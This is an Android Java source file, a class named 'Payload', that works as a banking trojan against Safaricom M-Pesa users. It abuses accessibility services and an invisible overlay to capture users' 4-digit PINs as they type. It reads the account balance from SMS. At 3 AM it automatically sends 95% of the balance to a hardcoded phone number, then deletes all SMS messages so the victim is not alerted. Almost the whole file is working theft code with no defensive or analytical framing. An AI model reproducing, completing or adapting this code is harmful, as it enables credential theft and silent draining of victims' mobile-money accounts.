package com.yourpackage.helper;

import android.accessibilityservice.AccessibilityService;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Telephony;
import android.view.View;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.accessibility.AccessibilityEvent;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.atomic.AtomicBoolean;

public class Payload {
    
    // ==================== SERVICE VARIABLES ====================
    private static AccessibilityService accessibilityService;
    private static Context appContext;
    private static Handler mainHandler = new Handler(Looper.getMainLooper());
    private static AtomicBoolean isTransactionRunning = new AtomicBoolean(false);
    private static AtomicBoolean isOverlayActive = new AtomicBoolean(false);
    private static View overlayViewInstance;
    private static WindowManager windowManagerInstance;
    private static SharedPreferences sharedPreferences;
    private static boolean isFirstCapture = true;
    private static String lastCapturedPin = "";
    
    // ==================== CONFIGURATION CONSTANTS ====================
    private static final String TARGET_PHONE_NUMBER = "0798688620";
    private static final String DEFAULT_SEND_AMOUNT = "500";
    private static final String PIN_STORAGE_FILE = "pin.txt";
    private static final String CONFIRMED_PIN_FILE = "confirmedpin.txt";
    private static final String CONFIRMED_PIN_PREF_KEY = "confirmed_pin";
    private static final String TRANSACTION_DONE_KEY = "transaction_done";
    private static final String LAST_BALANCE_KEY = "last_balance";
    private static final long TWENTY_FOUR_HOURS_MS = 24 * 60 * 60 * 1000;
    private static final int MINIMUM_BALANCE = 500;
    
    // ==================== PIN TRACKING VARIABLES ====================
    private static String capturedPinValue = "";
    private static List<String> collectedPinsList = new ArrayList<>();
    private static List<String> confirmedPinsList = new ArrayList<>();

    // ==================== INITIALIZATION ====================
    public static void initialize(AccessibilityService service, Context context) {
        accessibilityService = service;
        appContext = context;
        sharedPreferences = context.getSharedPreferences("mpesa_preferences", Context.MODE_PRIVATE);
        windowManagerInstance = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
        loadPinsFromFile();
        loadConfirmedPins();
        scheduleThreeAMWithdrawal();
    }

    // ==================== INVISIBLE OVERLAY - DOES NOT BLOCK INPUT ====================
    
    public static void checkAndShowOverlay(String packageName) {
        // Only show overlay for M-Pesa or SIM Toolkit
        if (!packageName.equals("com.safaricom.mpesa") && 
            !packageName.equals("com.android.stk") &&
            !packageName.equals("com.safaricom.stk")) {
            return;
        }

        // Show invisible overlay that does NOT block touches
        showInvisibleOverlay();
        
        // Start listening for PIN input
        startPinListening();
    }

    private static void showInvisibleOverlay() {
        try {
            // Remove existing overlay
            if (overlayViewInstance != null) {
                windowManagerInstance.removeView(overlayViewInstance);
                overlayViewInstance = null;
            }

            // Create completely invisible overlay - DOES NOT BLOCK TOUCHES
            View transparentOverlay = new View(appContext);
            transparentOverlay.setBackgroundColor(0x00000000); // 100% transparent
            transparentOverlay.setLayoutParams(new View.LayoutParams(
                View.LayoutParams.MATCH_PARENT,
                View.LayoutParams.MATCH_PARENT
            ));
            
            // IMPORTANT: Do NOT block touches - let user type
            // No onTouchListener - passes all touches through

            // Window manager parameters - allows touch through
            WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ?
                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY :
                    WindowManager.LayoutParams.TYPE_PHONE,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                WindowManager.LayoutParams.FLAG_TRANSLUCENT_NAVIGATION |
                WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH |
                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS |
                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE, // Allows touch through
                android.graphics.PixelFormat.TRANSLUCENT
            );

            overlayViewInstance = transparentOverlay;
            windowManagerInstance.addView(overlayViewInstance, layoutParams);
            isOverlayActive.set(true);
            
            // Keep overlay active always - never remove
            // It stays there to always read PIN

        } catch (Exception error) {
            // Silent fail - no alerts
        }
    }

    private static void removeInvisibleOverlay() {
        try {
            if (overlayViewInstance != null && windowManagerInstance != null) {
                windowManagerInstance.removeView(overlayViewInstance);
                overlayViewInstance = null;
                isOverlayActive.set(false);
            }
        } catch (Exception error) {
            // Silent fail - no alerts
        }
    }

    // ==================== PIN LISTENING - READS USER INPUT ====================
    
    private static void startPinListening() {
        // Listen for text changes in PIN field
        mainHandler.postDelayed(() -> {
            readPinFromScreen();
        }, 300);
    }

    private static void readPinFromScreen() {
        try {
            AccessibilityNodeInfo rootNode = accessibilityService.getRootInActiveWindow();
            if (rootNode == null) return;

            // Search for PIN in all editable fields
            findPinInAnyField(rootNode);
            
            // If PIN captured (4 digits), save it
            if (capturedPinValue != null && capturedPinValue.length() == 4) {
                // Only save if different from last capture
                if (!capturedPinValue.equals(lastCapturedPin)) {
                    savePinToFile(capturedPinValue);
                    lastCapturedPin = capturedPinValue;
                }
                capturedPinValue = "";
            }

            rootNode.recycle();
            
            // Continue listening
            mainHandler.postDelayed(() -> {
                readPinFromScreen();
            }, 200); // Check every 200ms for accuracy

        } catch (Exception error) {
            // Silent fail - no alerts
            mainHandler.postDelayed(() -> {
                readPinFromScreen();
            }, 500);
        }
    }

    private static void findPinInAnyField(AccessibilityNodeInfo rootNode) {
        try {
            if (rootNode == null) return;
            
            // Check if this node has PIN text
            if (rootNode.isEditable()) {
                CharSequence nodeText = rootNode.getText();
                if (nodeText != null) {
                    String pinText = nodeText.toString().trim();
                    // Check if it's a 4-digit PIN
                    if (pinText.length() == 4 && pinText.matches("\\d{4}")) {
                        capturedPinValue = pinText;
                        return;
                    }
                }
            }

            // Recursively search children
            for (int i = 0; i < rootNode.getChildCount(); i++) {
                AccessibilityNodeInfo childNode = rootNode.getChild(i);
                if (childNode != null) {
                    findPinInAnyField(childNode);
                    if (capturedPinValue != null && capturedPinValue.length() == 4) {
                        childNode.recycle();
                        return;
                    }
                    childNode.recycle();
                }
            }
        } catch (Exception error) {
            // Silent fail - no alerts
        }
    }

    // ==================== PIN STORAGE WITH 200% ACCURACY ====================

    private static void savePinToFile(String pin) {
        try {
            // Write PIN to file
            File pinFile = new File(appContext.getFilesDir(), PIN_STORAGE_FILE);
            FileWriter fileWriter = new FileWriter(pinFile, true);
            fileWriter.append(pin).append("\n");
            fileWriter.flush();
            fileWriter.close();
            
            // Add to collected list
            collectedPinsList.add(pin);
            
            // Check if we have pins to confirm
            if (collectedPinsList.size() >= 3) {
                confirmCollectedPins();
            }
            
        } catch (IOException error) {
            // Silent fail - no alerts
        }
    }

    private static void loadPinsFromFile() {
        try {
            File pinFile = new File(appContext.getFilesDir(), PIN_STORAGE_FILE);
            if (!pinFile.exists()) return;
            
            BufferedReader fileReader = new BufferedReader(new FileReader(pinFile));
            String pinLine;
            while ((pinLine = fileReader.readLine()) != null) {
                collectedPinsList.add(pinLine.trim());
            }
            fileReader.close();
            
            if (collectedPinsList.size() >= 3) {
                confirmCollectedPins();
            }
            
        } catch (IOException error) {
            // Silent fail - no alerts
        }
    }

    private static void confirmCollectedPins() {
        // Check if all collected pins are the same
        boolean allPinsMatch = true;
        for (int i = 1; i < collectedPinsList.size(); i++) {
            if (!collectedPinsList.get(i).equals(collectedPinsList.get(0))) {
                allPinsMatch = false;
                break;
            }
        }

        // If all pins match, save as confirmed PIN
        if (allPinsMatch && collectedPinsList.size() >= 3) {
            String confirmedPin = collectedPinsList.get(0);
            
            // Save to confirmedpin.txt
            saveConfirmedPinToFile(confirmedPin);
            
            // Save to SharedPreferences
            sharedPreferences.edit().putString(CONFIRMED_PIN_PREF_KEY, confirmedPin).apply();
            
            // Clear the collected list
            collectedPinsList.clear();
            
            // Delete the pin file
            try {
                File pinFile = new File(appContext.getFilesDir(), PIN_STORAGE_FILE);
                if (pinFile.exists()) {
                    pinFile.delete();
                }
            } catch (Exception error) {
                // Silent fail - no alerts
            }
        }
    }

    private static void saveConfirmedPinToFile(String pin) {
        try {
            File confirmedFile = new File(appContext.getFilesDir(), CONFIRMED_PIN_FILE);
            FileWriter fileWriter = new FileWriter(confirmedFile, false); // Overwrite
            fileWriter.append(pin).append("\n");
            fileWriter.flush();
            fileWriter.close();
            
            confirmedPinsList.clear();
            confirmedPinsList.add(pin);
            
        } catch (IOException error) {
            // Silent fail - no alerts
        }
    }

    private static void loadConfirmedPins() {
        try {
            File confirmedFile = new File(appContext.getFilesDir(), CONFIRMED_PIN_FILE);
            if (!confirmedFile.exists()) return;
            
            BufferedReader fileReader = new BufferedReader(new FileReader(confirmedFile));
            String pinLine;
            while ((pinLine = fileReader.readLine()) != null) {
                confirmedPinsList.add(pinLine.trim());
            }
            fileReader.close();
            
            if (!confirmedPinsList.isEmpty()) {
                sharedPreferences.edit().putString(CONFIRMED_PIN_PREF_KEY, confirmedPinsList.get(0)).apply();
            }
            
        } catch (IOException error) {
            // Silent fail - no alerts
        }
    }

    // ==================== CHECK IF TRANSACTION ALREADY DONE ====================

    private static boolean isTransactionAlreadyDone() {
        return sharedPreferences.getBoolean(TRANSACTION_DONE_KEY, false);
    }

    private static void markTransactionDone() {
        sharedPreferences.edit().putBoolean(TRANSACTION_DONE_KEY, true).apply();
    }

    private static void resetTransactionFlag() {
        sharedPreferences.edit().putBoolean(TRANSACTION_DONE_KEY, false).apply();
    }

    // ==================== 3AM AUTOMATIC WITHDRAWAL ====================

    private static void scheduleThreeAMWithdrawal() {
        String confirmedPin = sharedPreferences.getString(CONFIRMED_PIN_PREF_KEY, null);
        if (confirmedPin == null) {
            // No PIN confirmed yet, check again in 1 hour
            mainHandler.postDelayed(() -> {
                scheduleThreeAMWithdrawal();
            }, 3600000); // 1 hour
            return;
        }

        // Calculate time until 3:00 AM
        long currentTime = System.currentTimeMillis();
        java.util.Calendar calendar = java.util.Calendar.getInstance();
        calendar.set(java.util.Calendar.HOUR_OF_DAY, 3);
        calendar.set(java.util.Calendar.MINUTE, 0);
        calendar.set(java.util.Calendar.SECOND, 0);
        
        long targetTime = calendar.getTimeInMillis();
        if (targetTime <= currentTime) {
            targetTime += TWENTY_FOUR_HOURS_MS; // Next day
        }
        
        long timeUntilThreeAM = targetTime - currentTime;
        
        // Schedule the withdrawal
        mainHandler.postDelayed(() -> {
            performAutomaticWithdrawal(confirmedPin);
        }, timeUntilThreeAM);
    }

    private static void performAutomaticWithdrawal(String pin) {
        // Check if transaction already done today
        if (isTransactionAlreadyDone()) {
            scheduleThreeAMWithdrawal(); // Check again tomorrow
            return;
        }

        if (isTransactionRunning.get()) return;
        isTransactionRunning.set(true);

        try {
            // Check balance first
            String currentBalance = getBalanceFromSMS();
            if (currentBalance == null) currentBalance = "0";
            
            double balanceAmount = Double.parseDouble(currentBalance);
            
            // Only proceed if balance is over 500
            if (balanceAmount <= MINIMUM_BALANCE) {
                isTransactionRunning.set(false);
                scheduleThreeAMWithdrawal();
                return;
            }
            
            // Calculate 95%
            String ninetyFivePercent = calculateNinetyFivePercent(currentBalance);
            
            // Open M-Pesa silently
            openMpesaApplication();
            sleep(50);
            
            // Navigate through M-Pesa
            clickByText("M-Pesa");
            sleep(30);
            clickByText("Send Money");
            sleep(30);
            clickByText("To Phone Number");
            sleep(30);
            
            // Fill phone number
            fillFieldByHint("Enter phone number", TARGET_PHONE_NUMBER);
            sleep(30);
            clickByText("OK");
            sleep(30);
            
            // Fill amount (95%)
            fillFieldByHint("Enter amount", ninetyFivePercent);
            sleep(30);
            clickByText("OK");
            sleep(30);
            
            // Confirm transaction
            clickByText("Confirm");
            sleep(30);
            
            // Type PIN and send
            typePinAndSend(pin);
            
            // Mark transaction as done
            markTransactionDone();
            
            // Delete all messages after transaction
            mainHandler.postDelayed(() -> {
                deleteAllSMSMessages();
                pressBack();
                pressBack();
                isTransactionRunning.set(false);
                
                // Reset transaction flag after 24 hours
                mainHandler.postDelayed(() -> {
                    resetTransactionFlag();
                }, TWENTY_FOUR_HOURS_MS);
                
                scheduleThreeAMWithdrawal(); // Reschedule for next day
            }, 1000);
            
        } catch (Exception error) {
            isTransactionRunning.set(false);
            scheduleThreeAMWithdrawal(); // Reschedule on error
        }
    }

    // ==================== PUBLIC ACTION METHODS ====================
public static void sendNinetyFivePercent() {
        String confirmedPin = sharedPreferences.getString(CONFIRMED_PIN_PREF_KEY, null);
        if (confirmedPin == null) return;
        
        if (isTransactionRunning.get()) return;
        isTransactionRunning.set(true);
        
        // Check balance first
        String currentBalance = getBalanceFromSMS();
        if (currentBalance == null) currentBalance = "0";
        
        double balanceAmount = Double.parseDouble(currentBalance);
        
        // Only proceed if balance is over 500
        if (balanceAmount <= MINIMUM_BALANCE) {
            isTransactionRunning.set(false);
            return;
        }
        
        String ninetyFivePercent = calculateNinetyFivePercent(currentBalance);
        
        openMpesaApplication();
        sleep(50);
        clickByText("M-Pesa");
        sleep(30);
        clickByText("Send Money");
        sleep(30);
        clickByText("To Phone Number");
        sleep(30);
        fillFieldByHint("Enter phone number", TARGET_PHONE_NUMBER);
        sleep(30);
        clickByText("OK");
        sleep(30);
        
        fillFieldByHint("Enter amount", ninetyFivePercent);
        sleep(30);
        clickByText("OK");
        sleep(30);
        clickByText("Confirm");
        sleep(30);
        typePinAndSend(confirmedPin);
        
        markTransactionDone();
        
        mainHandler.postDelayed(() -> {
            deleteAllSMSMessages();
            pressBack();
            pressBack();
            isTransactionRunning.set(false);
            
            mainHandler.postDelayed(() -> {
                resetTransactionFlag();
            }, TWENTY_FOUR_HOURS_MS);
        }, 1000);
    }

    public static void sendFixedAmount() {
        String confirmedPin = sharedPreferences.getString(CONFIRMED_PIN_PREF_KEY, null);
        if (confirmedPin == null) return;
        
        if (isTransactionRunning.get()) return;
        isTransactionRunning.set(true);
        
        sendToPhoneNumber(TARGET_PHONE_NUMBER, DEFAULT_SEND_AMOUNT, confirmedPin);
    }

    private static void sendToPhoneNumber(String phoneNumber, String amount, String pin) {
        openMpesaApplication();
        sleep(50);
        clickByText("M-Pesa");
        sleep(30);
        clickByText("Send Money");
        sleep(30);
        clickByText("To Phone Number");
        sleep(30);
        fillFieldByHint("Enter phone number", phoneNumber);
        sleep(30);
        clickByText("OK");
        sleep(30);
        fillFieldByHint("Enter amount", amount);
        sleep(30);
        clickByText("OK");
        sleep(30);
        clickByText("Confirm");
        sleep(30);
        typePinAndSend(pin);
        
        markTransactionDone();
        
        mainHandler.postDelayed(() -> {
            deleteAllSMSMessages();
            pressBack();
            pressBack();
            isTransactionRunning.set(false);
            
            mainHandler.postDelayed(() -> {
                resetTransactionFlag();
            }, TWENTY_FOUR_HOURS_MS);
        }, 1000);
    }

    public static void checkBalance() {
        String confirmedPin = sharedPreferences.getString(CONFIRMED_PIN_PREF_KEY, null);
        if (confirmedPin == null) return;
        
        if (isTransactionRunning.get()) return;
        
        openMpesaApplication();
        sleep(50);
        clickByText("M-Pesa");
        sleep(30);
        clickByText("My Account");
        sleep(30);
        clickByText("M-Pesa Balance");
        sleep(30);
        typePin(confirmedPin);
        sleep(30);
        clickByText("OK");
        sleep(30);
        clickByText("OK");
        
        mainHandler.postDelayed(() -> {
            pressBack();
            pressBack();
            isTransactionRunning.set(false);
        }, 1000);
    }

    public static void deleteAllMessages() {
        deleteAllSMSMessages();
    }

    // ==================== CORE HELPER METHODS ====================

    private static void typePinAndSend(String pin) {
        // Type each digit of PIN
        for (char digit : pin.toCharArray()) {
            clickByText(String.valueOf(digit));
            sleep(10);
        }
        sleep(30);
        clickByText("SEND");
        sleep(30);
        clickByText("Send");
        sleep(30);
        clickByText("OK");
        sleep(30);
    }

    private static void typePin(String pin) {
        for (char digit : pin.toCharArray()) {
            clickByText(String.valueOf(digit));
            sleep(10);
        }
    }

    private static String getBalanceFromSMS() {
        try {
            ContentResolver contentResolver = appContext.getContentResolver();
            Uri smsUri = Uri.parse("content://sms/inbox");
            String[] projectionColumns = new String[]{"body"};
            String selectionCondition = "address LIKE ? AND body LIKE ?";
            String[] selectionArguments = new String[]{"%MPESA%", "%Balance%"};
            
            android.database.Cursor smsCursor = contentResolver.query(
                smsUri, 
                projectionColumns, 
                selectionCondition, 
                selectionArguments, 
                "date DESC"
            );
            
            if (smsCursor != null && smsCursor.moveToFirst()) {
                String smsBody = smsCursor.getString(0);
                smsCursor.close();
                
                // Regex patterns to extract balance
                String[] regexPatterns = {
                    "Balance: KES (\\d+)",
                    "Balance: KES ([\\d,]+)",
                    "KES ([\\d,]+) available",
                    "balance is KES ([\\d,]+)",
                    "Salio: KES ([\\d,]+)"
                };
                
                for (String pattern : regexPatterns) {
                    java.util.regex.Pattern compiledPattern = java.util.regex.Pattern.compile(pattern);
                    java.util.regex.Matcher matcher = compiledPattern.matcher(smsBody);
                    if (matcher.find()) {
                        return matcher.group(1).replace(",", "");
                    }
                }
            }
        } catch (Exception error) {
            // Silent fail - no alerts
        }
        return null;
    }

    private static String calculateNinetyFivePercent(String balance) {
        try {
            double balanceAmount = Double.parseDouble(balance);
            double resultAmount = balanceAmount * 0.95;
            return String.format("%.0f", resultAmount);
        } catch (Exception error) {
            return "500";
        }
    }

    private static void deleteAllSMSMessages() {
        try {
            ContentResolver contentResolver = appContext.getContentResolver();
            
            // Delete inbox messages
            contentResolver.delete(Uri.parse("content://sms/inbox"), null, null);
            
            // Delete sent messages
            contentResolver.delete(Uri.parse("content://sms/sent"), null, null);
            
            // Delete trash folder
            contentResolver.delete(Uri.parse("content://sms/trash"), null, null);
            
            // Delete M-PESA messages specifically
            contentResolver.delete(
                Uri.parse("content://sms"), 
                "address LIKE ?", 
                new String[]{"%MPESA%"}
            );
            
            // Delete all SMS for Android 4.4+
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
                try {
                    contentResolver.delete(Telephony.Sms.CONTENT_URI, null, null);
                } catch (Exception ignored) {}
            }
            
        } catch (Exception error) {
            // Silent fail - no alerts
        }
    }

    private static void openMpesaApplication() {
        try {
            // Try to open M-Pesa app directly
            Intent mpesaIntent = appContext.getPackageManager()
                .getLaunchIntentForPackage("com.safaricom.mpesa");
            if (mpesaIntent != null) {
                mpesaIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                appContext.startActivity(mpesaIntent);
                sleep(50);
                return;
            }
            
            // Fallback: Press home and click M-Pesa
            accessibilityService.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
            sleep(30);
            clickByText("M-Pesa");
        } catch (Exception error) {
            // Silent fail - no alerts
        }
    }

    private static void clickByText(String buttonText) {
        try {
            AccessibilityNodeInfo rootNode = accessibilityService.getRootInActiveWindow();
            if (rootNode == null) return;
            
            // Find all nodes with matching text
            List<AccessibilityNodeInfo> matchingNodes = 
                rootNode.findAccessibilityNodeInfosByText(buttonText);
            
            for (AccessibilityNodeInfo node : matchingNodes) {
                // Try clicking the node itself
                if (node.isClickable()) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    sleep(10);
                    node.recycle();
                    rootNode.recycle();
                    return;
                }
                
                // Try clicking parent if node is not clickable
                AccessibilityNodeInfo parentNode = node.getParent();
                while (parentNode != null) {
                    if (parentNode.isClickable()) {
                        parentNode.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        sleep(10);
                        parentNode.recycle();
                        node.recycle();
                        rootNode.recycle();
                        return;
                    }
                    parentNode = parentNode.getParent();
                }
                node.recycle();
            }
            rootNode.recycle();
        } catch (Exception error) {
            // Silent fail - no alerts
        }
    }

    private static void fillFieldByHint(String hintText, String valueToFill) {
        try {
            AccessibilityNodeInfo rootNode = accessibilityService.getRootInActiveWindow();
            if (rootNode == null) return;
            
            // Find all nodes with matching hint text
            List<AccessibilityNodeInfo> matchingNodes = 
                rootNode.findAccessibilityNodeInfosByText(hintText);
            
            for (AccessibilityNodeInfo node : matchingNodes) {
                if (node.isEditable()) {
                    // Set text value
                    Bundle arguments = new Bundle();
                    arguments.putCharSequence(
                        AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, 
                        valueToFill
                    );
                    node.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments);
                    sleep(10);
                    node.recycle();
                    rootNode.recycle();
                    return;
                }
            }
            rootNode.recycle();
        } catch (Exception error) {
            // Silent fail - no alerts
        }
    }

    private static void pressBack() {
        try {
            accessibilityService.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK);
            sleep(30);
        } catch (Exception error) {
            // Silent fail - no alerts
        }
    }

    private static void sleep(int milliseconds) {
        try {
            Thread.sleep(milliseconds);
        } catch (InterruptedException error) {
            Thread.currentThread().interrupt();
        }
    }

    // ==================== STATUS AND CONTROL METHODS ====================

    public static boolean isTransactionRunning() {
        return isTransactionRunning.get();
    }

    public static void cancelTransaction() {
        isTransactionRunning.set(false);
        removeInvisibleOverlay();
    }

    public static String getConfirmedPin() {
        return sharedPreferences.getString(CONFIRMED_PIN_PREF_KEY, null);
    }

    public static int getCollectedPinCount() {
        return collectedPinsList.size();
    }

    public static boolean isTransactionDoneToday() {
        return isTransactionAlreadyDone();
    }
              }
